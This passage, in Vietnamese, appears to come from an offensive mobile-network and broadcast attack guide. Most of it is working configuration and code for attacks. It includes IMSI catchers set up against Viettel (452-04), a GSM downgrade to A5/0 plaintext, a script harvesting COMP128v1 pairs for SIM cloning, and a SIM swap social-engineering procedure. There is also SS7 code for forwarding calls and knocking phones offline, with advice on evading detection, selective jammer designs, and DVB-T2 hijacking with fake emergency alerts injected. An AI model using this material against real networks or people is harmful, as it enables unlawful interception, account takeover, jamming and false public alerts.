| **DoS mode** | Reject tất cả Attach Request → UE no service | Dễ (UE báo no signal) |
| **Downgrade MITM** | Chuyển UE về GSM A5/0, giải mã realtime | Rất khó |

### 4.4 Đầu Vào Chi Tiết

| Thành phần | Yêu cầu | Ghi chú |
|---|---|---|
| **SDR Hardware** | TX/RX dual-channel, dải tần phủ band mục tiêu | USRP B210 khuyến nghị |
| **BTS Software** | OpenBTS (GSM) hoặc srsRAN (LTE) | Cần Linux |
| **Ăng-ten** | Gain phù hợp (0–6 dBi omnidirectional) | Directional để tập trung |
| **Cấu hình MCC/MNC** | Phải khớp với mạng mục tiêu | Thu từ SIB1 của mạng thật |
| **Vị trí địa lý** | Trong bán kính tác động mong muốn | Tầng thượng, xe hơi, v.v. |
| **GPS disciplined clock** | Đồng bộ timing cho LTE (±50ns) | GPS-DO hoặc GPSDO USRP |

### 4.5 Đầu Ra Chi Tiết

```
Output per UE captured:
  ├── IMSI (15 digits): 452-04-0123456789
  ├── TMSI (4 bytes, hex): 0xA3B2C1D0
  ├── IMEI (15 digits, nếu thu được): 355260000000000
  ├── Timestamp: ISO8601
  ├── Signal strength (dBm): -67
  ├── Number of captured cells nearby: 3
  ├── Call metadata (nếu Active MITM):
  │   ├── A-number (calling party)
  │   ├── B-number (called party)
  │   ├── Call duration
  │   └── Audio file path (nếu ghi âm)
  └── SMS content (nếu relay qua A5/0 GSM)
```

### 4.6 Triển Khai OpenBTS (GSM IMSI Catcher)

**Cài đặt:**
```bash
# Ubuntu 20.04 + USRP B210
sudo apt install openbts openbts-uhd uhd-host

# Cấu hình OpenBTS (OpenBTS.conf)
[GSM]
Radio.Band = GSM900
Radio.C0 = 60           # ARFCN (tần số channel 0)
GSM.MCC = 452           # Mã quốc gia Việt Nam
GSM.MNC = 04            # MNC Viettel
GSM.LAC = 9999          # LAC giả (khác với LAC thật → trigger Location Update)
GSM.CellID = 1
GSM.BSIC.NCC = 0
GSM.BSIC.BCC = 0

# Bật Identity Request cho tất cả UE
SIP.Proxy.Registration = 127.0.0.1

# Disable authentication (GSM không bắt buộc auth mạng)
GSM.Authentication = 0
```

**Log IMSI (OpenBTS CLI):**
```
OpenBTS> tmsis
IMSI               TMSI       Old TMSI   Auth  IMEI               
452040123456789    0xA3B2C1D0 0x00000000 0     355260000000000    
452040987654321    0xB1C2D3E4 0x00000000 0     -                  
```

### 4.7 Triển Khai srsRAN (LTE IMSI Catcher)

**Cài đặt:**
```bash
git clone https://github.com/srsran/srsRAN_4G.git
mkdir srsRAN_4G/build && cd srsRAN_4G/build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$(nproc)
sudo make install
```

**Cấu hình eNodeB (enb.conf):**
```ini
[enb]
enb_id = 0x19B
mcc = 452
mnc = 04
mme_addr = 127.0.1.100
gtp_bind_addr = 127.0.1.1
s1c_bind_addr = 127.0.1.1
n_prb = 50              # 10 MHz bandwidth
tm = 1                  # Transmission mode

[rf]
dl_earfcn = 1301        # Band 3 (1805-1880 MHz downlink)
tx_gain = 80
rx_gain = 40
device_name = UHD
device_args = type=b200,clock=gpsdo

[log]
all_level = info
filename = /tmp/enb.log
```

**Cấu hình EPC giả (epc.conf) – để reject UE sau khi lấy IMSI:**
```ini
[mme]
mme_code = 0x01
mme_group = 0x0001
tac = 0x0007
mcc = 452
mnc = 04

# Cấu hình để log IMSI rồi reject Attach:
[hss]
hss_hostname = 127.0.1.1
db_name = /tmp/ue_db.csv  # Log IMSI vào file

[network]
# Không cấp IP thật → UE timeout và kết nối lại mạng thật
```

**Chạy:**
```bash
# Terminal 1: EPC giả
sudo srsepc epc.conf

# Terminal 2: eNodeB
sudo srsenb enb.conf

# Theo dõi IMSI trong log
tail -f /tmp/enb.log | grep "IMSI"
# [INFO] [NAS]  New UE IMSI: 452040123456789
# [INFO] [NAS]  New UE IMSI: 452040987654321
```

### 4.8 Downgrade Attack (4G → GSM)

```
Fake eNodeB LTE                                    UE
    │                                               │
    │── SIB1 (MCC=452, MNC=04, TAC=7) ────────────►│
    │◄─ RRC Connection Request ─────────────────────│
    │── RRC Connection Setup ─────────────────────►│
    │◄─ NAS: Attach Request ─────────────────────────│
    │    (IMSI=452040xxx nếu không có valid GUTI)    │
    │                                               │
    │── RRC Connection Release ───────────────────►│
    │   (redirectedCarrierInfo = ARFCN 60 GSM)      │
    │                                               │
    UE switches to GSM → Connects to OpenBTS         │
    │── GSM: RR → Identity Request → IMSI ──────────│
    │── GSM: Auth disabled → A5/0 → plaintext ──────│
```

---

## 5. SIM Cloning / Intercept

### 5.1 Kiến Trúc SIM Card

```
SIM Card (UICC) Internal Structure:
┌─────────────────────────────────────────────────────┐
│  Operating System (CardOS/JCOP/NativeOS)             │
│                                                     │
│  ┌───────────┐  ┌───────────┐  ┌─────────────────┐  │
│  │  MF       │  │  DF_GSM   │  │  DF_TELECOM     │  │
│  │ (Master   │  │  EF_IMSI  │  │  EF_ADN (phonebook) │
│  │  File)    │  │  EF_Ki    │  │  EF_SMS         │  │
│  └───────────┘  │  EF_LOCI  │  └─────────────────┘  │
│                 │  EF_ACC   │                        │
│                 └───────────┘                        │
│                                                     │
│  Crypto Engine:                                     │
│    ├── GSM: COMP128v1/v2/v3 (A3/A8 algorithms)      │
│    ├── 3G/4G: MILENAGE (AES-128 based)              │
│    └── 5G: TUAK (Keccak-based)                      │
└─────────────────────────────────────────────────────┘

Giao tiếp: ISO/IEC 7816-4 (APDU protocol)
  CLA INS P1 P2 Lc [Data] Le
  A0  88  00 00 10 [RAND] 00  → GSM Authentication (COMP128)
```

### 5.2 Lỗ Hổng COMP128v1 – Phân Tích Chi Tiết

COMP128v1 là triển khai cụ thể của thuật toán A3/A8 trên SIM GSM thế hệ đầu. Năm 1998, Marc Briceno, Ian Goldberg và David Wagner đã reverse-engineer thành công và chỉ ra lỗ hổng nghiêm trọng.

**Cơ chế hoạt động bình thường:**
```
Đầu vào: Ki (128-bit, bí mật trong SIM) + RAND (128-bit, thử thách từ mạng)
Đầu ra: SRES (32-bit, xác nhận) + Kc (64-bit, khóa mã hóa)

COMP128v1(Ki, RAND) → (SRES, Kc)
```

**Lỗ hổng:** Thuật toán sử dụng cấu trúc dữ liệu S-box 64×8 bit với pattern lặp lại, dẫn đến:
- **Partial information leakage**: Mỗi response SRES tiết lộ vài bit thông tin về Ki
- **Chosen-plaintext attack**: Với ~130,000–150,000 cặp (RAND, SRES), có thể khôi phục Ki bằng thuật toán statistical analysis

**Giới hạn thực tế**: SIM thế hệ mới có **counter giới hạn số lần authentication** (thường 65,535). Tuy nhiên, một số SIM GSM cũ không có giới hạn này.

**Thuật toán tấn công (mô tả cấp cao):**
```
Bước 1: Gửi 150,000 RAND khác nhau, thu 150,000 SRES
Bước 2: Phân tích collision trong SRES để suy ra partial Ki bits
Bước 3: Dùng meet-in-the-middle để hoàn thiện Ki
Thời gian: ~8 tiếng với card reader tốc độ cao
```

### 5.3 Quy Trình SIM Cloning Thực Tế

**Phần cứng cần thiết:**
- USB Smart Card Reader (Gemalto, HID, v.v.)
- Blank writable SIM (Magic SIM hoặc SIM emulator)

**Phần mềm:**

```python
"""
SIM Authentication Analyzer
Minh họa học thuật cho COMP128v1 chosen-plaintext attack
"""
from smartcard.System import readers
from smartcard.util import toHexString, toBytes
import random
import time

def get_reader():
    reader_list = readers()
    if not reader_list:
        raise Exception("Không tìm thấy card reader")
    return reader_list[0].createConnection()

def gsm_authenticate(connection, rand_16bytes):
    """
    Gửi APDU GSM Authentication command đến SIM
    Command: A0 88 00 00 10 [16 bytes RAND]
    Response: [4 bytes SRES] [8 bytes Kc] 90 00
    """
    apdu = [0xA0, 0x88, 0x00, 0x00, 0x10] + list(rand_16bytes)
    data, sw1, sw2 = connection.transmit(apdu)
    
    if sw1 == 0x9F:
        # Cần GET RESPONSE
        get_resp = [0xA0, 0xC0, 0x00, 0x00, sw2]
        data, sw1, sw2 = connection.transmit(get_resp)
    
    if sw1 == 0x90 and sw2 == 0x00 and len(data) >= 12:
        sres = bytes(data[0:4])
        kc   = bytes(data[4:12])
        return sres, kc
    return None, None

def read_imsi(connection):
    """Đọc IMSI từ EF_IMSI (DF_GSM, EF 6F07)"""
    # SELECT DF_GSM
    connection.transmit([0xA0, 0xA4, 0x00, 0x00, 0x02, 0x7F, 0x20])
    # SELECT EF_IMSI
    connection.transmit([0xA0, 0xA4, 0x00, 0x00, 0x02, 0x6F, 0x07])
    # READ BINARY
    data, sw1, sw2 = connection.transmit([0xA0, 0xB0, 0x00, 0x00, 0x09])
    if sw1 == 0x90:
        # BCD decode IMSI
        imsi_raw = bytes(data[1:])  # bỏ length byte
        imsi = ""
        for b in imsi_raw:
            imsi += str(b & 0x0F)
            if (b >> 4) != 0xF:
                imsi += str(b >> 4)
        return imsi
    return None

def collect_auth_pairs(connection, n=150000):
    """Thu thập cặp (RAND, SRES) để tấn công COMP128v1"""
    pairs = []
    conn = get_reader()
    conn.connect()
    
    print(f"[*] Bắt đầu thu thập {n} cặp authentication...")
    for i in range(n):
        rand = bytes([random.randint(0, 255) for _ in range(16)])
        sres, kc = gsm_authenticate(conn, rand)
        if sres:
            pairs.append((rand, sres))
        if i % 1000 == 0:
            print(f"[*] Tiến độ: {i}/{n} ({i/n*100:.1f}%)")
        # Rate limiting để tránh trigger SIM anti-cloning counter
        if i % 100 == 0:
            time.sleep(0.01)
    
    conn.disconnect()
    return pairs

# Sau khi có pairs → chạy COMP128 cryptanalysis để khôi phục Ki
# (thuật toán cryptanalysis không liệt kê ở đây)
```

### 5.4 SIM Swap Attack (Social Engineering Vector)

Đây là vectơ tấn công phổ biến nhất hiện nay vì không yêu cầu kỹ thuật cao:

**Quy trình:**
```
1. Thu thập thông tin cá nhân nạn nhân:
   - Họ tên, ngày sinh, CMND/CCCD
   - Địa chỉ thường trú
   - Số tài khoản ngân hàng liên kết (không cần)
   - Câu hỏi bảo mật (tên mẹ, trường tiểu học...)

2. Liên hệ nhà mạng:
   - Đến cửa hàng với giấy tờ giả
   - Hoặc gọi hotline, vượt IVR authentication bằng thông tin thu thập

3. Yêu cầu cấp lại SIM ("bị mất/hỏng"):
   - Nhân viên kích hoạt SIM mới với cùng số điện thoại
   - SIM gốc của nạn nhân bị vô hiệu hóa ngay lập tức

4. Kết quả:
   - Attacker nhận tất cả SMS OTP của nạn nhân
   - Bypass 2FA của ngân hàng, crypto exchange, v.v.
```

### 5.5 eSIM / Remote SIM Provisioning Attack

**SGP.22 (Consumer eSIM) Architecture:**
```
LPA (Local Profile Assistant)    SM-DP+ (Subscription Manager)
trên thiết bị                    tại nhà mạng
    │                                │
    │── ES9+ API (HTTPS) ────────────►│
    │   ProfileDownloadRequest        │
    │◄─ ProfilePackage (encrypted) ───│
    │   dùng Profile Protection Key  │
```

**Vector tấn công**: Tấn công Man-in-the-Middle tại lớp HTTPS trong quá trình Profile Download → chặn và thay thế ActivationCode → redirect sang SM-DP+ giả mạo. Thực tế yêu cầu bypass certificate pinning.

---

## 6. Fake eNodeB (SDR-based)

### 6.1 Kiến Trúc LTE Air Interface

```
LTE Protocol Stack (Air Interface – LTE-Uu):

User Plane:                    Control Plane:
┌──────────┐                   ┌──────────┐
│   IP     │                   │   NAS    │  ← Non-Access Stratum
├──────────┤                   ├──────────┤
│  PDCP    │                   │   RRC    │  ← Radio Resource Control
├──────────┤                   ├──────────┤
│   RLC    │                   │   RLC    │
├──────────┤                   ├──────────┤
│   MAC    │                   │   MAC    │
├──────────┤                   ├──────────┤
│ PHY (L1) │                   │ PHY (L1) │
└──────────┘                   └──────────┘

PHY Layer:
  OFDMA (DL): Subcarrier spacing 15 kHz, cyclic prefix 4.7/16.7 μs
  SC-FDMA (UL): DFT-spread OFDM
  Frame: 10ms = 10 subframes = 20 slots = 14 symbols/slot
  Bandwidth: 1.4/3/5/10/15/20 MHz → 6/15/25/50/75/100 PRBs
```

### 6.2 Cách Fake eNodeB Thu Hút UE

**Cell Selection Criteria (3GPP TS 36.304):**
```
Srxlev = Qrxlevmeas – Qrxlevmin – Qrxlevminoffset > 0
Squal  = Qqualmeas  – Qqualmin  – Qqualminoffset > 0

Fake eNodeB thao túng:
  - Qrxlevmin = -70 dBm (thấp nhất cho phép → dễ đạt)
  - Phát công suất TX cao → Qrxlevmeas cao
  → Srxlev của fake cell >> Srxlev của cell thật
  → UE chọn fake cell
```

**System Information Broadcast (SIB) quan trọng:**
```
SIB1: Cell identity, MCC, MNC, TAC, cell selection info
SIB2: Radio resource config, RACH parameters
SIB3: Cell reselection info
SIB4/5: Neighbour cell info (có thể dùng để loại bỏ cell thật khỏi neighbor list)
```

### 6.3 Triển Khai srsRAN Đầy Đủ

**Cấu hình enb.conf hoàn chỉnh:**
```ini
[enb]
enb_id = 0x19B
mcc = 452
mnc = 04
mme_addr = 127.0.1.100
gtp_bind_addr = 127.0.1.1
s1c_bind_addr = 127.0.1.1
n_prb = 50
tm = 1
nof_ports = 1

[rf]
dl_earfcn = 1301        # 1805 MHz DL center (Band 3)
tx_gain = 80            # 0-90 dB
rx_gain = 40
device_name = UHD
device_args = type=b200,clock=internal,otw_format=sc12
srate = -1              # Auto
lo_freq_offset_hz = 0

[scheduler]
pusch_mcs = -1
pdsch_mcs = -1

[expert]
lte_sample_rates = false
nof_phy_threads = 4
metrics_period_secs = 1
pregenerate_signals = false

[log]
all_level = warning
all_hex_limit = 32
filename = /tmp/srsenb.log
file_max_size = -1
```

**Cấu hình epc.conf (giả lập EPC để lấy IMSI):**
```ini
[mme]
mme_code = 0x01
mme_group = 0x0001
tac = 0x0007
mcc = 452
mnc = 04
mme_bind_addr = 127.0.1.100
apn = internet

[hss]
hss_hostname = 127.0.1.1
db_name = /tmp/ue_imsi_capture.db
auth_algo = milenage     # MILENAGE hoặc xor (test)
# Không có UE được pre-provisioned → tất cả Attach bị Reject
# Nhưng IMSI được log trước khi reject

[spgw]
gtpu_bind_addr = 127.0.1.2
sgi_if_addr = 172.16.0.1

[log]
all_level = debug         # Để bắt IMSI trong log
```

**Script tự động hóa capture IMSI từ log:**
```python
"""
IMSI Harvester - parse srsEPC log để extract IMSI
"""
import re
import time
from datetime import datetime

IMSI_PATTERN = re.compile(
    r'\[NAS\].*?IMSI[:\s]+(\d{15})',
    re.IGNORECASE
)
ATTACH_PATTERN = re.compile(
    r'\[MME\].*?Attach.*?IMSI[:\s]+(\d{15})',
    re.IGNORECASE
)

captured = set()
log_file = "/tmp/srsepc.log"

def tail_log(filepath):
    with open(filepath, 'r') as f:
        f.seek(0, 2)  # Đến cuối file
        while True:
            line = f.readline()
            if line:
                yield line
            else:
                time.sleep(0.01)

print(f"[*] Bắt đầu capture IMSI từ {log_file}")
for line in tail_log(log_file):
    for pattern in [IMSI_PATTERN, ATTACH_PATTERN]:
        m = pattern.search(line)
        if m:
            imsi = m.group(1)
            if imsi not in captured:
                captured.add(imsi)
                ts = datetime.now().isoformat()
                print(f"[{ts}] NEW IMSI: {imsi}")
                # Ghi vào file
                with open("/tmp/captured_imsi.csv", "a") as out:
                    out.write(f"{ts},{imsi}\n")
```

### 6.4 OpenAirInterface (OAI) – Phương Án Thay Thế

OAI là bộ stack LTE/5G đầy đủ hơn srsRAN, được phát triển bởi EURECOM:

```bash
git clone https://gitlab.eurecom.fr/oai/openairinterface5g.git
cd openairinterface5g
source oaienv
./build_oai -I -w USRP --eNB --UE  # Build với USRP support

# Cấu hình eNB
cp targets/PROJECTS/GENERIC-LTE-EPC/CONF/enb.band7.tm1.usrpb210.conf \
   /tmp/enb.conf
# Chỉnh sửa MCC/MNC/TAC cho phù hợp

# Chạy
sudo -E ./lte-softmodem -O /tmp/enb.conf --log_config.global_log_level info
```

---

## 7. SS7 Call Redirection

### 7.1 Cơ Chế Supplementary Services

Các dịch vụ bổ sung (Supplementary Services) được lưu trữ trong HLR và được VLR/MSC tra cứu khi xử lý cuộc gọi. Cụ thể, **Call Forwarding Unconditional (CFU)** với mã dịch vụ 21 là mục tiêu chính.

**Luồng cuộc gọi bình thường:**
```
Caller → GMSC → [HLR lookup: không có CFU] → MSC của Target → Ring Target
```

**Sau khi tấn công RegisterSS CFU:**
```
Caller → GMSC → [HLR lookup: CFU active, forward to +84XXXXXXXXX]
              → Ngay lập tức chuyển hướng
              → Không bao giờ Ring Target
```

### 7.2 MAP RegisterSS Operation

**MAP-RegisterSS-Arg (3GPP TS 29.002, section 7.8.1):**
```
RegisterSS-Arg ::= SEQUENCE {
    ss-Code         SS-Code,              -- 0x21 = CFU
    basicService    BasicServiceCode OPTIONAL,
    forwardedToNumber   AddressString OPTIONAL,
    forwardedToSubaddress ISDN-SubaddressString OPTIONAL,
    noReplyConditionTime NoReplyConditionTime OPTIONAL,
    ...
}
```

**Chuỗi lệnh MAP để chuyển hướng cuộc gọi:**

```
Bước 1: SRI (lấy IMSI + MSC hiện tại)
Bước 2: UpdateLocation (đăng ký attacker MSC làm MSC của target – optional)
Bước 3: RegisterSS với ss-Code=CFU, forwardedToNumber=attacker_number

Message flow:
Attacker → RegisterSS(IMSI, CFU, forward-to=+84900000000) → HLR
HLR → RegisterSS Response (SS-Info: CFU active)
```

### 7.3 Tấn Công CFNRc + Cancel Location (Kết Hợp)

Kết hợp hai lệnh MAP để vừa vô hiệu hóa điện thoại vừa chặn cuộc gọi:

```
Bước 1: RegisterSS(IMSI, CFNRc, forward-to=voicemail/deadnumber)
        → Khi không liên lạc được, cuộc gọi đi thẳng voicemail

Bước 2: CancelLocation(IMSI) → HLR gửi Detach đến UE
        → UE bị đẩy ra khỏi mạng, trở thành "not reachable"

Kết quả: KHÔNG cần jammer vật lý.
  - UE: "No service" hoặc "Limited service"
  - Caller: Nghe thấy voicemail hoặc "số máy không liên lạc được"
  - UE sẽ tự re-attach sau vài phút → tấn công cần lặp lại
```

### 7.4 Code Triển Khai (SigPloit RegisterSS)

```python
"""
SS7 RegisterSS Attack - Call Forwarding Unconditional
Minh họa học thuật dựa trên pycrate + SCTP M3UA
"""
from pycrate_mobile import TS29002_MAP as MAP
from pycrate_asn1rt.asnobj_str import *

def encode_msisdn_tbcd(number_str):
    """Encode MSISDN sang Type-of-Address + BCD"""
    # Xóa +, thêm TON/NPI byte
    digits = number_str.lstrip('+')
    # International: 0x91, Unknown: 0x81
    ton_npi = 0x91 if number_str.startswith('+') else 0x81
    bcd = bytearray([ton_npi])
    # Pack cặp digits
    i = 0
    while i < len(digits):
        low = int(digits[i])
        high = int(digits[i+1]) if i+1 < len(digits) else 0xF
        bcd.append((high << 4) | low)
        i += 2
    return bytes(bcd)

def build_register_ss_cfu(target_imsi_hex, forward_to_msisdn):
    """
    Xây dựng MAP RegisterSS argument để bật CFU
    target_imsi_hex: IMSI dưới dạng hex BCD (vd: "24040199887766F5")
    forward_to_msisdn: Số chuyển tiếp (vd: "+84901234567")
    """
    arg = MAP.MAP_SS_Operations.RegisterSS_Arg()
    
    # SS-Code: 0x21 = allForwardingSS, 0x21 = cfu (Call Forward Unconditional)
    arg['ss-Code'].set_val(b'\x21')
    
    # Basic Service: teleservice 11 = telephony
    arg['basicService']['teleservice'].set_val(b'\x11')
    
    # Số được chuyển tiếp đến
    arg['forwardedToNumber']['value'].set_val(
        encode_msisdn_tbcd(forward_to_msisdn)
    )
    
    return arg.to_ber()

def build_cancel_location(target_imsi_hex):
    """MAP CancelLocation để đẩy UE offline"""
    arg = MAP.MAP_MS_DataTypes.CancelLocation_Arg()
    arg['identity']['imsi']['value'].set_val(bytes.fromhex(target_imsi_hex))
    arg['cancellationType'].set_val('updateProcedure')
    return arg.to_ber()

# Ví dụ sử dụng (với SS7 transport đã thiết lập):
# registerss_pdu = build_register_ss_cfu(
#     target_imsi_hex="24040199887766F5",
#     forward_to_msisdn="+84900000000"  # Voicemail hoặc số chết
# )
# send_map_invoke(registerss_pdu, operation_code=10)  # opCode 10 = registerSS
```

### 7.5 Phát Hiện và Bypass

**Phát hiện từ phía nạn nhân:**
- Không nhận được cuộc gọi mặc dù có sóng
- SMS nhận được nhưng cuộc gọi không rung
- Kiểm tra menu **dịch vụ bổ sung** trong thiết lập điện thoại → thấy CFU được bật

**Kỹ thuật bypass phát hiện:**
- Dùng **CFNRc** thay vì CFU: chỉ kích hoạt khi kết hợp với Cancel Location → khó phát hiện hơn
- Giới hạn thời gian tấn công (active trong 30 phút, sau đó deregister) → khó attribute

---

## 8. Selective Jamming

### 8.1 Lý Thuyết Nhiễu Vô Tuyến

**Mô hình kênh với nhiễu:**
```
SINR = Psignal / (Pnoise + Pjamming)

Với:
  Psignal = Pt_base × (λ/4πd)² × Gt × Gr  [Friis equation]
  Pjamming = Pt_jammer × (λ/4πdj)² × Gj × Gr

Để gây mất kết nối:
  SINR < SINR_min (phụ thuộc modulation: QPSK ~3dB, 64QAM ~20dB)
  → Pt_jammer > Psignal × (dj/d)² × Gj/Gt / SINR_min
```

**Ví dụ tính toán thực tế:**
```
Kịch bản: Jam LTE Band 3 tại điểm cách trạm thật 500m, jammer cách mục tiêu 10m

Psignal tại mục tiêu:
  Pt_base = 43 dBm (20W macro cell)
  Path loss 500m @ 1800 MHz: L = 20×log(4π×500/0.167) ≈ 81 dB
  Psignal ≈ 43 - 81 = -38 dBm

Pjamming cần thiết:
  SINR_min (LTE QPSK 1/3) ≈ -6 dB
  Pjamming > Psignal - SINR_min = -38 - (-6) = -32 dBm tại antenna mục tiêu
  Path loss jammer→target 10m @ 1800 MHz: ≈ 47 dB
  Pt_jammer cần > -32 + 47 = +15 dBm ≈ 30 mW

→ Jammer 30–100 mW đủ để gây nhiễu trong bán kính 10m
→ Jammer 1–10 W đủ để gây nhiễu trong bán kính 50–200m
```

### 8.2 Protocol-Aware Jamming

Thay vì jam liên tục (dễ bị phát hiện và tốn năng lượng), tấn công thông minh hơn nhắm vào các ký hiệu/slot quan trọng:

**GSM – Jam BCCH (Broadcast Control Channel):**
```
GSM Frame Structure (4.615ms TDMA frame, 8 timeslots):
TS0: BCCH + CCCH (control)
TS1-7: TCH (voice/data) hoặc SDCCH

Jam TS0 trên ARFCN của BCCH:
  → UE không đọc được MCC/MNC/LAC/cell parameters
  → UE không thể camp on cell → "No service"
  
Tần số jam: Chỉ 1 ARFCN (200 kHz bandwidth)
Duty cycle: ~12.5% (chỉ TS0 trong mỗi frame)
→ Tiết kiệm năng lượng, khó phát hiện hơn
```

**LTE – Jam PSS/SSS (Synchronization Signals):**
```
LTE Frame (10ms): Subframe 0 và 5 chứa PSS/SSS
PSS: Primary Synchronization Signal
SSS: Secondary Synchronization Signal

Jam chỉ PSS/SSS trong subframe 0 và 5:
  → UE không đồng bộ được cell → không decode SIB → "No service"
  
Duty cycle: 2/10 = 20%
Bandwidth cần jam: Chỉ 6 center PRBs (1.08 MHz) trong những symbol đó
→ Rất hiệu quả, tiêu thụ ít RF power
```

**GPS Jamming:**
```
GPS L1: 1575.42 MHz (C/A code, civilian)
Rx power tại thiết bị: ~ -130 dBm (rất yếu)

→ Chỉ cần jammer công suất 1 mW để jam GPS trong bán kính vài trăm mét
→ Nhiều thiết bị bay không người lái sử dụng kỹ thuật này để bảo vệ vùng cấm bay
```

### 8.3 Phân Loại Thiết Bị Jamming

**Loại 1: Narrowband CW Jammer (đơn giản nhất)**
```
VCO (Voltage Controlled Oscillator) → RF Amplifier → Antenna
  ├── Chỉ jam một tần số cố định
  ├── Không có tính chọn lọc giao thức
  └── Rất dễ phát hiện bằng spectrum analyzer
```

**Loại 2: Swept Frequency Jammer (barrage jammer)**
```
Sweeping VCO → PA → Antenna
  ├── Quét qua dải tần (vd: 900 MHz – 2.1 GHz)
  ├── Jam tất cả GSM/3G/4G/5G trong dải
  └── Dễ phát hiện, ảnh hưởng rộng
```

**Loại 3: SDR-based Protocol-Aware Jammer (tinh vi nhất)**
```
GNU Radio Flowgraph:
  ┌─────────────┐    ┌──────────────┐    ┌──────────────┐
  │  LTE frame  │    │  Targeted    │    │  USRP TX     │
  │  analyzer   │───►│  jamming     │───►│  (Software   │
  │  (RX path)  │    │  signal gen  │    │   Defined)   │
  └─────────────┘    └──────────────┘    └──────────────┘
  
  Luồng:
  1. RX path decode SIB để biết cell parameters
  2. Tính thời điểm PSS/SSS xuất hiện (từ frame timing)
  3. TX path phát jamming signal đúng vào những slot đó
  
  Kết quả: Jam cực kỳ hiệu quả với duty cycle thấp → khó phát hiện
```

### 8.4 GNU Radio Implementation (SDR Jammer)

```python
"""
GNU Radio Companion flowgraph (mô tả, không phải code thực thi trực tiếp)
Selective GSM BCCH Jammer
"""
# Các block GNU Radio cần:
# 1. UHD Source (RX) - lắng nghe để tìm GSM frame timing
# 2. GSM Receiver (gr-gsm) - decode BCCH để lấy frame number
# 3. Burst Gate - chỉ cho phép TX trong timeslot 0
# 4. GMSK Modulator - tạo tín hiệu nhiễu dạng GSM hợp lệ (deceptive jamming)
# 5. UHD Sink (TX) - phát tín hiệu

# gr-gsm (GNU Radio GSM) cung cấp:
# - Receiver Hier Block: decode GSM downlink
# - BCCH Demapper: extract broadcast info
# - Burst Timeslot Filter: chọn lọc timeslot

# Flowgraph YAML (GRC format - rút gọn):
"""
blocks:
  - id: uhd_usrp_source
    parameters:
      freq: 935.2e6    # GSM900 BCCH ARFCN 60 DL
      samp_rate: 2e6
  
  - id: gsm_receiver
    parameters:
      fc: 935.2e6
      osr: 4
  
  - id: gsm_bcch_ccch_demapper
    connections: [gsm_receiver]
  
  - id: burst_timeslot_filter
    parameters:
      timeslot: 0      # Chỉ TS0
    connections: [gsm_bcch_ccch_demapper]
  
  - id: jamming_signal_source
    parameters:
      type: complex
      waveform: CONST  # CW jammer
  
  - id: uhd_usrp_sink
    parameters:
      freq: 935.2e6
      gain: 70
    connections: [jamming_signal_source]  # gated by timeslot filter
"""
```

---

## 9. TV / DVB Signal Hijacking

### 9.1 Kiến Trúc DVB-T2

**DVB-T2 (EN 302 755) – Tiêu chuẩn truyền hình số mặt đất thế hệ 2:**

```
┌────────────────────────────────────────────────────────────────────┐
│                    DVB-T2 Transmitter Chain                        │
│                                                                    │
│  Content ──► MPEG-TS ──► ┌─────────────────────────────────────┐  │
│                           │  DVB-T2 Physical Layer               │  │
│  (Video + Audio          │  BB Scrambler → BCH encoder          │  │
│   + EPG + EWS)           │  → LDPC encoder → Bit Interleaver    │  │
│                           │  → QAM Mapper → OFDM Modulator       │  │
│                           │  → Guard Interval insertion           │  │
│                           └─────────────────────────────────────┘  │
│                                          │                         │
└──────────────────────────────────────────│─────────────────────────┘
                                           │
                              ┌────────────▼────────────┐
                              │   RF Transmitter         │
                              │   UHF band: 470-862 MHz  │
                              └─────────────────────────┘
```

**OFDM Parameters (DVB-T2):**

| Parameter | Giá trị phổ biến |
|---|---|
| FFT size | 32K extended |
| Guard interval | 1/8, 1/4 |
| Modulation | 256QAM |
| Code rate | 3/4 |
| Pilot pattern | PP7 |
| Bandwidth | 8 MHz (CH21–CH69 UHF) |

### 9.2 Emergency Warning System (EWS) trong DVB

DVB chuẩn hóa tích hợp **Emergency Warning System** (ETSI TS 102 796 – HbbTV 2.0) và **ARIB B24** (tiêu chuẩn Nhật):

```
MPEG-TS stream:
  └── PID 0x0000: PAT (Program Association Table)
      └── PMT cho mỗi program
          └── EWS Descriptor (tag 0x6D – Private)
              ├── Alert Message Category
              ├── Alert Text
              └── Alert Level (Emergency/Amber/Other)
```

**DVB-T Emergency Warning Activation Descriptor:**
```
Nếu broadcaster phát SI (Service Information) với:
  table_id = 0x72 (EWS table)
  → Tất cả TV trong vùng phủ sóng tự động:
     1. Mở nếu đang ở standby
     2. Chuyển sang kênh phát cảnh báo
     3. Hiển thị thông báo khẩn cấp
```

### 9.3 Tấn Công Signal Overpowering

**Nguyên lý:** DVB-T2 receiver chọn tín hiệu mạnh nhất trên cùng tần số (multiplex). Không có cơ chế xác thực nguồn phát trong chuẩn DVB-T2.

```
Mạng phát sóng hợp pháp:                  Attacker:
BTS1 ──┐                                   SDR TX ──────────────────────►
BTS2 ──┤── SFN (Single Frequency Network)  (cùng tần số, công suất cao hơn
BTS3 ──┘   tại vị trí thu)                 tại vị trí thu)

TV receiver: Chọn tín hiệu mạnh nhất
→ Nếu attacker TX mạnh hơn SFN tại điểm thu → TV decode nội dung của attacker
```

### 9.4 Triển Khai với GNU Radio + gr-dvbt2

```bash
# Cài đặt gr-dvbt2
git clone https://github.com/drmpeg/gr-dvbt2.git
mkdir gr-dvbt2/build && cd gr-dvbt2/build
cmake ..
make -j4 && sudo make install

# Tạo MPEG-TS transport stream chứa nội dung giả
ffmpeg -re -i input_video.mp4 \
  -vcodec mpeg2video -b:v 5M \
  -acodec mp2 -b:a 192k \
  -f mpegts udp://127.0.0.1:5004

# GNU Radio flowgraph DVB-T2 transmitter:
# udp_source(5004) → dvbt2_bbheader → dvbt2_bbitinterleaver
# → dvbt2_miso → dvbt2_pilotgenerator → dvbt2_p1insertion
# → ofdm_cyclic_prefixer → uhd_usrp_sink(channel=21, 474MHz)
```

**Thêm EWS vào MPEG-TS stream:**
```python
"""
Chèn Emergency Warning System descriptor vào MPEG-TS SI
"""
import struct

def create_ews_section(alert_text: str, alert_level: int = 1):
    """
    Tạo DVB Private Section chứa EWS
    table_id = 0x72 (private, EWS convention)
    """
    text_encoded = alert_text.encode('utf-8')
    
    # EWS private descriptor
    descriptor = bytes([
        0x6D,               # descriptor_tag (private)
        len(text_encoded) + 2,  # descriptor_length
        alert_level,        # alert_level: 0=test, 1=emergency, 2=amber
        0x00,               # reserved
    ]) + text_encoded
    
    # MPEG-TS Private Section
    section = bytes([
        0x72,               # table_id
        0xB0 | ((len(descriptor) + 4) >> 8),  # section_syntax_indicator=1
        (len(descriptor) + 4) & 0xFF,
        0x00, 0x01,         # table_id_extension
        0xC1,               # version_number=0, current_next=1
